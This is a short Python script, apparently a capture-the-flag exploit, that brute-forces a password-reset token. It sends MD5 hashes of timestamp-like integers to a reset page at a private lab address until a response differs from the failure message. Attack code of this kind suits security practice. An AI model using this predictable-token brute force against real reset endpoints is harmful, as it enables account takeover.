#!/bin/env python3
import argparse
import subprocess
import requests
import re
from colorama import Fore, Style
from hashlib import md5
from datetime import datetime
from dateutil.relativedelta import relativedelta

def try_reset(token:str) -> bool:
  host='http://10.10.10.6/r3s3t_t1m3M4ch1N3.php'
  response = requests.post(host, data={'token': token, 'submit':'check'})

  if re.search(r'Omg! This epoch is dangerous! Better retry.', response.text):
      print(Fore.RED + f'[-] fail with {token}' + Style.RESET_ALL)
      return False
  else:
      print(Fore.GREEN + f'[*] unexpected response for {token}' + Style.RESET_ALL)
      print(response.text)
      return True

parser = argparse.ArgumentParser(prog='md5calc', description='MD5 Jurassic Travel PWNX')
# parser.add_argument('-t', '--time', required=True, type=int, nargs="+")

# args = parser.parse_args()
# for t in args.time:

def notify(message:str):
    subprocess.Popen(['notify-send', message])
    return

for t in range(66 * 1000000, 201 * 1000000, 1000000):
    d = md5(bytearray(f'{t}'.encode()))
    print(Fore.YELLOW + f'[~] token for {t} is {d.hexdigest()}'+ Style.RESET_ALL)

    if try_reset(d.hexdigest()):
        notify('sembra che qualcosa funzioni!')
        break
